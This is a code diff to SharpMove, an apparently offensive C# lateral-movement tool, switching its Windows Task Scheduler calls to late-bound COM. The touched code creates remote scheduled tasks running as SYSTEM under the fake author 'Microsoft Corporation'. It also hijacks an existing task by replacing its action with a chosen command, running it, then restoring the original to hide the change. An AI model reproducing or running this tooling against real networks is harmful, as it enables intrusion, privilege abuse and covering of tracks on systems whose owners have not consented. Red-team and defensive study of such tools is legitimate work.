@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Linq;
-using TaskScheduler;
 using System.Threading;
 using System.Management;
 using System.Reflection;
@@ -14,6 +13,59 @@ namespace SharpMove
     {
         //change to whatever vbs you want
         public static string vbsdata = @"";
+
+        public enum _TASK_LOGON_TYPE
+        {
+            TASK_LOGON_NONE,
+            TASK_LOGON_PASSWORD,
+            TASK_LOGON_S4U,
+            TASK_LOGON_INTERACTIVE_TOKEN,
+            TASK_LOGON_GROUP,
+            TASK_LOGON_SERVICE_ACCOUNT,
+            TASK_LOGON_INTERACTIVE_TOKEN_OR_PASSWORD,
+        }
+
+        public enum _TASK_TRIGGER_TYPE2
+        {
+            TASK_TRIGGER_EVENT = 0,
+            TASK_TRIGGER_TIME = 1,
+            TASK_TRIGGER_DAILY = 2,
+            TASK_TRIGGER_WEEKLY = 3,
+            TASK_TRIGGER_MONTHLY = 4,
+            TASK_TRIGGER_MONTHLYDOW = 5,
+            TASK_TRIGGER_IDLE = 6,
+            TASK_TRIGGER_REGISTRATION = 7,
+            TASK_TRIGGER_BOOT = 8,
+            TASK_TRIGGER_LOGON = 9,
+            TASK_TRIGGER_SESSION_STATE_CHANGE = 11,
+            TASK_TRIGGER_CUSTOM_TRIGGER_01 = 12
+        }
+
+        public enum _TASK_CREATION
+        {
+            TASK_VALIDATE_ONLY = 1,
+            TASK_CREATE = 2,
+            TASK_UPDATE = 4,
+            TASK_CREATE_OR_UPDATE = 6,
+            TASK_DISABLE = 8,
+            TASK_DONT_ADD_PRINCIPAL_ACE = 16,
+            TASK_IGNORE_REGISTRATION_TRIGGERS = 32
+        }
+
+        public enum _TASK_ACTION_TYPE
+        {
+            TASK_ACTION_EXEC = 0,
+            TASK_ACTION_COM_HANDLER = 5,
+            TASK_ACTION_SEND_EMAIL = 6,
+            TASK_ACTION_SHOW_MESSAGE = 7,
+        }
+
+        public enum _TASK_RUNLEVEL
+        {
+            TASK_RUNLEVEL_LUA,
+            TASK_RUNLEVEL_HIGHEST,
+        }
+
 
         static void Usage()
         {
@@ -631,7 +683,8 @@ namespace SharpMove
             string Parameters = retcmd[2];
             string Binary = retcmd[1];
             string Command = String.Format("{0}\\{1}", Directory, Binary);
-            TaskScheduler.TaskScheduler scheduler = new TaskScheduler.TaskScheduler();
+            var type = Type.GetTypeFromProgID("Schedule.Service");
+            dynamic scheduler = Activator.CreateInstance(type);
             //For now this will be SYSTEM only - needs to be updated
             string runas = "SYSTEM";
             string[] logininfo = new string[2];
@@ -669,27 +722,28 @@ namespace SharpMove
                     Environment.Exit(0);
                 }
             }
-            ITaskDefinition task = scheduler.NewTask(0);
+            var task = scheduler.NewTask(0);
             task.RegistrationInfo.Author = "Microsoft Corporation";
             task.RegistrationInfo.Description = "Microsoft Services Standby Task";
             task.Settings.RunOnlyIfIdle = false;
 
-            IExecAction action = (IExecAction)task.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
+            var action = task.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
             action.Id = "Exec Action";
             action.Path = Command;
             action.Arguments = Parameters;
 
-            ITaskFolder folder = scheduler.GetFolder("\\");
+            var folder = scheduler.GetFolder("\\");
             Console.WriteLine("[+] Creating task '{0}' on   : {1}", taskname, host);
-            IRegisteredTask regTask = folder.RegisterTaskDefinition(taskname, task, (int)_TASK_CREATION.TASK_CREATE_OR_UPDATE, runas, null, _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN, "");
+            var regTask = folder.RegisterTaskDefinition(taskname, task, (int)_TASK_CREATION.TASK_CREATE_OR_UPDATE, runas, null, _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN, "");
             Console.WriteLine("[+] Executing '{0}' task...  : {1}", taskname, host);
             Thread.Sleep(2000);
-            IRunningTask runTask = regTask.Run(null);
+            var runTask = regTask.Run(null);
         }
 
         static void DeleteSchTask(string host, string username, string password, string taskname)
         {
-            TaskScheduler.TaskScheduler objScheduler = new TaskScheduler.TaskScheduler();
+            var type = Type.GetTypeFromProgID("Schedule.Service");
+            dynamic objScheduler = Activator.CreateInstance(type);
             string[] logininfo = new string[2];
             if (username != "" && password != "")
             {
@@ -723,7 +777,7 @@ namespace SharpMove
                     Console.WriteLine("[X] Error: {0}", e.Message);
                 }
             }
-            ITaskFolder containingFolder = objScheduler.GetFolder("\\");
+            var containingFolder = objScheduler.GetFolder("\\");
             Console.WriteLine("[+] Deleting task {0} on    : {1}", taskname, host);
             containingFolder.DeleteTask(taskname, 0);
         }
@@ -822,7 +876,8 @@ namespace SharpMove
             string Parameters = retcmd[2];
             string Binary = retcmd[1];
             string Command = String.Format("{0}\\{1}", Directory, Binary);
-            TaskScheduler.TaskScheduler scheduler = new TaskScheduler.TaskScheduler();
+            var type = Type.GetTypeFromProgID("Schedule.Service");
+            dynamic scheduler = Activator.CreateInstance(type);
 
             string runas = string.Empty;
             string[] logininfo = new string[2];
@@ -861,15 +916,15 @@ namespace SharpMove
                 }
             }
 
-            ITaskFolder f1 = scheduler.GetFolder(sfolder);
-            ITaskDefinition otask = null;
-            IRegisteredTaskCollection tasks = f1.GetTasks(1);
+            var f1 = scheduler.GetFolder(sfolder);
+            dynamic otask = null;
+            var tasks = f1.GetTasks(1);
             _TASK_LOGON_TYPE ltype = _TASK_LOGON_TYPE.TASK_LOGON_S4U;
-            IRegistrationInfo tsksecdes = null;
+            dynamic tsksecdes = null;
             string origcmd = string.Empty;
             string origargs = string.Empty;
 
-            foreach (IRegisteredTask tsk in tasks)
+            foreach (var tsk in tasks)
             {
                 if (tsk.Name.Equals(taskname))
                 {
@@ -882,12 +937,12 @@ namespace SharpMove
             }
 
             Console.WriteLine("[+] Original Task Information");
-            ITriggerCollection triggerCollection = otask.Triggers;
-            foreach (ITrigger trigger in triggerCollection)
+            var triggerCollection = otask.Triggers;
+            foreach (var trigger in triggerCollection)
             {
             }
-            IActionCollection actionCollection = otask.Actions;
-            foreach (IExecAction acts in actionCollection)
+            var actionCollection = otask.Actions;
+            foreach (var acts in actionCollection)
             {
                 if (acts.Type != _TASK_ACTION_TYPE.TASK_ACTION_EXEC)
                 {
@@ -904,7 +959,7 @@ namespace SharpMove
                 }
             }
             actionCollection.Clear();
-            IExecAction newact = (IExecAction)otask.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
+            var newact = otask.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
             newact.Path = Command;
             newact.Arguments = Parameters;
             /*
@@ -917,9 +972,9 @@ namespace SharpMove
             try
             {
                 Console.WriteLine("[+] Modifying task action      :  {0}", command);
-                IRegisteredTask regTask1 = f1.RegisterTaskDefinition(taskname, otask, (int)_TASK_CREATION.TASK_UPDATE, runas, null, ltype, tsksecdes);
+                var regTask1 = f1.RegisterTaskDefinition(taskname, otask, (int)_TASK_CREATION.TASK_UPDATE, runas, null, ltype, tsksecdes);
                 Thread.Sleep(2000);
-                IRunningTask runTask = regTask1.Run(null);
+                var runTask = regTask1.Run(null);
             }
             catch (Exception ex)
             {
@@ -930,13 +985,13 @@ namespace SharpMove
             Thread.Sleep(3000);
             Console.WriteLine("[+] Setting {0} back to original state", taskname);
             actionCollection.Clear();
-            IExecAction origact = (IExecAction)otask.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
+            var origact = otask.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
             origact.Path = origcmd;
             origact.Arguments = origargs;
 
             try
             {
-                IRegisteredTask regTask2 = f1.RegisterTaskDefinition(taskname, otask, (int)_TASK_CREATION.TASK_UPDATE, runas, null, ltype, tsksecdes);
+                var regTask2 = f1.RegisterTaskDefinition(taskname, otask, (int)_TASK_CREATION.TASK_UPDATE, runas, null, ltype, tsksecdes);
                 Thread.Sleep(1000);
             }
             catch (Exception ex)
